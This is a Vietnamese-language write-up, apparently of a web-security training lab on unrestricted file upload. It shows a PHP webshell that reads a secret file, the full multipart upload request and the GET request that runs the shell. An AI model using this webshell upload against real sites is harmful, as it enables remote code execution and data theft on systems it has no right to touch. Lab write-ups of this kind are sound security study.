![[upload-unrestricted.png]]
Lab up thẳng shell.php rồi GET tới file để đọc secret.

> [!NOTE] phân tích đề
> - lab cho up avatar, không check gì.
> - sau khi quan sát ... mình thấy up xong nó trả về đường dẫn `/files/...`.
> - -> mà lại chạy được php luôn.
> - nên mình up thẳng webshell.
> - liên quan: [[lys thuyet file upload]] , [[file upload]]

### hướng giải
- [ ] login `wiener:peter`.
- [ ] vào My account, tìm chỗ upload avatar.
- [ ] tạo `shell.php` với nội dung đọc secret.
- [ ] up lên, ghi lại path trả về.
- [ ] GET tới path đó để lấy secret.

### giải
- mình tạo file `shell.php`:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
- request upload:
```http
POST /my-account/avatar HTTP/1.1
Host: xxx.web-security-academy.net
Content-Type: multipart/form-data; boundary=----abc

------abc
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------abc--
```
- response:
```html
File uploaded to /files/avatars/shell.php
```
- -> up thành công.
- mình GET luôn:
```http
GET /files/avatars/shell.php HTTP/1.1
```
- response:
```
a1b2c3d4e5f6secret...
```
- -> lụm secret.
- => submit là solved.
- kết quả: RCE không cần bypass gì.

> [!NOTE] bài học
> - không validate là toang nhanh nhất.
> - nên mình luôn thử `shell.php` trước khi nghĩ bypass.
> - tiếp: [[Lab-File upload content-type bypass]]
